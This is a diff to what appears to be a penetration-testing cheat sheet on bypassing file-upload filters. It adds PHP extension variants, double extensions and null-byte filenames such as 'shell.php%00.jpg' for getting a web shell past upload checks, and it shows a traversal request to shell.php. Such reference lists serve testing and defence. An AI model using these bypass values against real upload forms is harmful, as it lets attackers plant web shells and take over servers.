@@ -28,21 +28,30 @@ GET /files/avatars/../shell.php
 
 Defaults php extensions
 ```
+.jpeg.php
+.jpg.php
+.png.php
 .php
 .php3
 .php4
 .php5
 .php7
+.php8
 .pht
-.phps
 .phar
 .phpt
 .pgif
 .phtml
 .phtm
-.inc
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
 ```
 
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
 # Web shell upload via obfuscated file extension
 
 filename="shell.php%00.jpg"
